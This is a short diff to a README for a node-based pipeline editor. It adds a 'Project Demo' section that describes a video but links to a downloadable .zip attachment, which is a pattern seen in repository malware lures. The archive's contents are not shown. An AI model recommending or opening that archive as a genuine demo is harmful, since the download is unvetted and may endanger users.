@@ -4,7 +4,7 @@
 
 An extensible, architecture-driven pipeline editor designed for scalability. This project implements a modular node system with dynamic UI updates and a robust FastAPI backend for structural validation.
 
----
+
 
 ## 📌 Overview
 
@@ -29,6 +29,10 @@ This repository focuses on building a **scalable node-based pipeline editor**. U
 ---
 
 ## 🧠 Architecture Highlights
+
+### 📺 Project Demo [Video of the node-based pipeline in action]
+---[Project Demo.zip](https://github.com/user-attachments/files/25403949/Project.Demo.zip)
+<br/>
 
 
 
